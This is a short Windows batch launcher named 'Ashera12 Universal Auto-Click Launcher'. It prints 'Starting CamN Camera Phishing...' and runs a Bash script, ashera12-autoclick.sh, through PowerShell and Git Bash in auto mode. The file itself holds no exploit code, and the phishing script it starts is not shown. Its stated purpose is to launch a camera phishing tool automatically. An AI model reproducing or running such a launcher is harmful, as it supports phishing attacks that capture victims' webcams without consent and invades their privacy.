@echo off
cd /d "%~dp0"
title Ashera12 Universal Launcher
color 0A
echo.
echo ========================================
echo    Ashera12 Universal Auto-Click Launcher
echo ========================================
echo.
echo Starting CamN Camera Phishing...
echo.
powershell -Command "& 'C:\Program Files\Git\bin\bash.exe' -c './ashera12-autoclick.sh --auto'"
echo.
echo ========================================
echo Launcher completed! Press any key to exit...
pause > nul
